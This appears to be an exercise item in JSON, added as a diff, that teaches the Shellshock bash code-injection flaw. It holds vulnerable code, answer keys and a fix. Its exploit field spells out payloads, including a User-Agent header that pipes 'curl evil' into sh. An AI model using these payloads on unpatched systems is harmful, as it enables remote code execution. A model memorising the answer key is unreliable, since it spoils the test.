@@ -1,0 +1,120 @@
+{
+  "id": "srd-0006",
+  "date": "2026-10-11",
+  "difficulty": "hard",
+  "language": "c",
+  "estimatedMinutes": 30,
+  "snippet": {
+    "files": [
+      {
+        "name": "variables.c",
+        "code": "/* Simplified from bash initialize_shell_variables(), pre-patch. */\nvoid initialize_shell_variables(char **env)\n{\n    char *name, *string;\n    int string_length;\n\n    for (int i = 0; env[i]; i++)\n    {\n        name = savestring(env[i]);\n        string = strchr(name, '=');\n        if (string == 0)\n            continue;\n        *string++ = '\\0';               /* split NAME=VALUE */\n        string_length = strlen(string);\n\n        /* If the value looks like a function definition, import it. */\n        if (STREQN(\"() {\", string, 4))\n        {\n            char *expr = (char *)xmalloc(3 + strlen(name) + string_length);\n            sprintf(expr, \"%s %s\", name, string);\n\n            /* Parse and run the string to define the function. */\n            parse_and_execute(expr, name, SEVAL_NOHIST);\n        }\n    }\n}\n",
+        "notes": {
+          "7": "Loops over every environment variable the process inherited.",
+          "9": "Makes a private copy of the `NAME=VALUE` string.",
+          "10": "Finds the `=` that separates the name from the value.",
+          "13": "Replaces the `=` with a NUL so `name` and `string` (the value) are separate strings.",
+          "14": "Measures the value's length.",
+          "17": "Checks whether the value begins with `() {` — i.e. it looks like a shell function definition.",
+          "19": "Allocates a buffer big enough for `NAME VALUE`.",
+          "20": "Writes `NAME VALUE` into that buffer.",
+          "23": "Feeds the whole string to the command parser/executor to define the function."
+        }
+      }
+    ]
+  },
+  "stages": {
+    "line": {
+      "file": "variables.c",
+      "line": 22,
+      "yellowRadius": 2,
+      "maxGuesses": 5
+    },
+    "bugClass": {
+      "answer": "code-inj",
+      "options": [
+        "code-inj",
+        "command-inj",
+        "buffer-overflow",
+        "format-string",
+        "int-overflow",
+        "insecure-deser"
+      ]
+    },
+    "why": {
+      "answerIndex": 2,
+      "options": [
+        {
+          "label": "`sprintf` on line 20 can overflow `expr` when `name` is attacker-controlled",
+          "whyWrong": "The buffer on line 19 is sized from the actual lengths, so there's no overflow here. The flaw is what gets executed, not how it's copied."
+        },
+        {
+          "label": "`STREQN` compares only 4 bytes, so a 3-byte value causes an out-of-bounds read",
+          "whyWrong": "Not the issue — the value is NUL-terminated and this short-circuits safely. The danger is executing the value's contents."
+        },
+        {
+          "label": "`parse_and_execute` runs the whole string and doesn't stop after the `}`, so any commands appended to the value are executed"
+        }
+      ]
+    },
+    "fix": {
+      "answerIndex": 3,
+      "options": [
+        {
+          "label": "Reject values containing a semicolon",
+          "diff": "         if (STREQN(\"() {\", string, 4))\n+        {\n+            if (strchr(string, ';')) continue;\n             ...",
+          "whyWrong": "Trailing commands need no semicolon (a newline or other construct works), and legitimate function bodies contain semicolons. Filtering characters does not constrain what the parser executes."
+        },
+        {
+          "label": "Only import variables whose names are on an allowlist",
+          "diff": "+        if (!is_allowed_function_name(name)) continue;\n         if (STREQN(\"() {\", string, 4))",
+          "whyWrong": "The injection is in the VALUE, not the name; an allowed name with a malicious value still triggers execution of the trailing payload."
+        },
+        {
+          "label": "Copy the value with strncpy to avoid overflow",
+          "diff": "-            sprintf(expr, \"%s %s\", name, string);\n+            snprintf(expr, 3 + strlen(name) + string_length, \"%s %s\", name, string);",
+          "whyWrong": "There is no buffer overflow here; the allocation already accounts for the lengths. The flaw is that the whole string is handed to the command parser."
+        },
+        {
+          "label": "Parse only a single function definition and refuse trailing commands",
+          "diff": "-            parse_and_execute(expr, name, SEVAL_NOHIST);\n+            if (parse_and_execute(expr, name,\n+                    SEVAL_NOHIST | SEVAL_FUNCDEF | SEVAL_ONECMD) != 0)\n+                report_error(\"error importing function definition for `%s'\", name);"
+        }
+      ]
+    }
+  },
+  "source": {
+    "origin": "cve",
+    "cve": "CVE-2014-6271",
+    "project": "GNU Bash",
+    "fixCommit": "https://git.savannah.gnu.org/cgit/bash.git/commit/?id=5b4e8f0c43b2f0c7cf02e6bf09be609c7d64a58e",
+    "advisory": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+    "license": "GPL-3.0-or-later",
+    "attribution": "GNU Bash, CVE-2014-6271 (Shellshock)"
+  },
+  "training": {
+    "exploit": "Set an environment variable to `() { :;}; /usr/bin/id`. When bash starts and imports it, line 23 parses the empty function `() { :;}` and then keeps going, executing `/usr/bin/id`. Over CGI, a request header like `User-Agent: () { :;}; curl evil|sh` becomes the `HTTP_USER_AGENT` env var, so an unauthenticated HTTP request runs commands on the server.",
+    "concepts": [
+      "CWE-94",
+      "CVE-2014-6271"
+    ],
+    "hints": {
+      "line": "The problem is the single call that *runs* the imported string.",
+      "bugClass": "Attacker data is parsed and executed as program code.",
+      "why": "Does parsing stop at the end of the function body?",
+      "fix": "Tell the parser to accept only a function definition and nothing after it."
+    }
+  },
+  "writeup": {
+    "summary": "Bash imports environment variables whose value begins with `() {` as function definitions by concatenating name and value and feeding the whole thing to `parse_and_execute`. The parser does not stop at the end of the function body, so a value like `() { :;}; /usr/bin/id` defines an empty function and then executes `id`. Because web servers (CGI), DHCP clients and SSH forced commands all place attacker-controlled data into environment variables, this became trivial remote code execution. The fix adds `SEVAL_FUNCDEF | SEVAL_ONECMD`: parse exactly one command and require it to be a function definition, so any trailing payload is rejected rather than run. This is Shellshock.",
+    "readNext": [
+      {
+        "label": "CVE-2014-6271 (NVD)",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271"
+      },
+      {
+        "label": "Troy Hunt: Everything you need to know about Shellshock",
+        "url": "https://www.troyhunt.com/everything-you-need-to-know-about2/"
+      }
+    ]
+  }
+}
